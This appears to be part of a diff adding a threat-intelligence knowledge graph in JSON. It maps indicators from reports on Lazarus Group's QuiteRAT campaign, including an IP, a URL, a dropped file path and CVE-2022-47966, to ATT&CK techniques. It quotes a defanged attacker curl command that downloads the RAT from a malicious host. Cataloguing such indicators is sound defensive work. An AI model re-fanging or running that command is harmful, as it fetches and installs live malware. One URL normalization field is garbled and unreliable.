+              "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+            ]
+          ]
+        },
+        "raw_value": "c:\\users\\public\\notify[.]exe.",
+        "canonical_value": "C:\\users\\public\\notify.exe.",
+        "normalized_value": "C:\\users\\public\\notify.exe."
+      },
+      {
+        "node_id": "IOC_87e0ac3e1872",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "146[.]4[.]21[.]94",
+        "edges": [
+          "EDGE_8c7af8c62b7e"
+        ],
+        "source": {
+          "146[.]4[.]21[.]94_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              11,
+              "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+            ],
+            [
+              12,
+              "The IP address 146[.]4[.]21[.]94 has been used by Lazarus since at least May 2022."
+            ]
+          ]
+        },
+        "raw_value": "146[.]4[.]21[.]94",
+        "canonical_value": "146[.]4[.]21[.]94"
+      },
+      {
+        "node_id": "IOC_8ca059eaa156",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat",
+        "edges": [
+          "EDGE_6b424c67f46e",
+          "EDGE_afc0846cafa1"
+        ],
+        "source": {
+          "hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              11,
+              "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+            ]
+          ]
+        },
+        "raw_value": "hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat",
+        "canonical_value": "http://hxxp[://]146.4.21.94/tmp/tmp/comp.dat",
+        "normalized_value": "http://hxxp[://]146.4.21.94/tmp/tmp/comp.dat"
+      },
+      {
+        "node_id": "IOC_a0b9506a1b80",
+        "node_class": "ioc",
+        "node_type": "CVE",
+        "node_text": "CVE-2022-47966",
+        "edges": [
+          "EDGE_cd347e1fa5c2"
+        ],
+        "source": {
+          "CVE-2022-47966_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              2,
+              "In this campaign, the attackers began exploiting a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) five days after PoCs for the exploit were publicly disclosed to deliver and deploy a newer malware threat we track as “QuiteRAT.” Security researchers first discovered this implant in February, but little has been written on it since then."
+            ],
+            [
+              24,
+              "The new campaign we’re disclosing exploited a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) — which has a Kenna risk score of 100 out of 100 — to deploy QuiteRAT."
+            ]
+          ],
+          "CVE-2022-47966_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              3,
+              "In February — five days after the disclosure of proofs-of-compromise (PoCs) relating to the 9.8 \"Critical\"-rated CVE-2022-47966, a remote code execution (RCE) vulnerability for Zoho ManageEngine — Lazarus exploited ManageEngine ServiceDesk to infiltrate healthcare organizations in the US and UK, as well as a UK-based \"Internet backbone infrastructure provider,\" according to a new report from Cisco Talos."
+            ]
+          ],
+          "CVE-2022-47966_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              5,
+              "\"Both implants are built on the Qt framework and include capabilities such as arbitrary command execution.\"\nThe use of the Qt framework is seen as an intentional effort on the part of the adversary to make analysis a lot more challenging as it \"increases the complexity of the malware's code.\"\nThe activity, detected in early 2023, involved the exploitation of CVE-2022-47966, a mere five days after proof-of-concept (Poc) for the flaw emerged online, to directly deploy the QuiteRAT binary from a malicious URL."
+            ]
+          ]
+        },
+        "raw_value": "CVE-2022-47966",
+        "canonical_value": "CVE-2022-47966",
+        "normalized_value": "CVE-2022-47966"
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_0706e16453d0",
+      "node_u": "IOC_32375433d366",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_078f029bf19d",
+      "node_u": "HL_c6426a20d0e4",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1c8221338a2c",
+      "node_u": "HL_689a82869e5a",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_22089e4df493",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1112",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_26474d40dc1b",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_338ade9a3c12",
+      "node_u": "HL_689a82869e5a",
+      "node_v": "TTP_T1190",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4a5a4dd9ca35",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1132",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5e1509f969f6",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1033",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6b424c67f46e",
+      "node_u": "IOC_8ca059eaa156",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_89318e9bef34",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1190",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8c7af8c62b7e",
+      "node_u": "IOC_87e0ac3e1872",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_91904d83ceab",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_9300a4803403",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_9ffaab14ca6e",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_afc0846cafa1",
+      "node_u": "IOC_8ca059eaa156",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c8825bb9df74",
+      "node_u": "HL_689a82869e5a",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_cb0a24e4fd1d",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1016",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_cd347e1fa5c2",
+      "node_u": "IOC_a0b9506a1b80",
+      "node_v": "TTP_T1190",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_cd6b7971419f",
+      "node_u": "HL_1f0939c917cb",
+      "node_v": "TTP_T1190",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e73679f7cb65",
+      "node_u": "HL_c6426a20d0e4",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_41a3e9d02f8f",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_bcb86c9d4e3a",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1497",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ef79394053f0",
+      "node_u": "HL_2fbc618c0be7",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_23d2b832f3f5",
+      "node_u": "HL_b7d8370101dd",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_24e2474709ac",
+      "node_u": "HL_0554eb0c9aa5",
+      "node_v": "TTP_T1219",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_24e8e5e7e35a",
+      "node_u": "HL_b7d8370101dd",
+      "node_v": "TTP_T1090",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3a2474c023a1",
+      "node_u": "HL_59e13fdcdca2",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4ce50616bcef",
+      "node_u": "HL_1af9ec9b4bc9",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5a8c7ca9ed57",
+      "node_u": "HL_83747d3796c4",
+      "node_v": "TTP_T1190",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_60cf39087132",
+      "node_u": "HL_1af9ec9b4bc9",
+      "node_v": "TTP_T1090",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6e49934a1253",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1219",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f57195fb7162",
+      "node_u": "HL_b7d8370101dd",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1591b7ae70bb",
+      "node_u": "HL_e317a3974fac",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_514a834cce34",
+      "node_u": "HL_e317a3974fac",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a72252a21a07",
+      "node_u": "HL_e317a3974fac",
+      "node_v": "TTP_T1082",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_cfeb34075efd",
+      "node_u": "HL_e317a3974fac",
+      "node_v": "TTP_T1053",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d0364e9a4b53",
+      "node_u": "HL_e317a3974fac",
+      "node_v": "TTP_T1497",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_16b8d7aadb0c",
+      "node_u": "HL_e317a3974fac",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    }
+  ]
+}
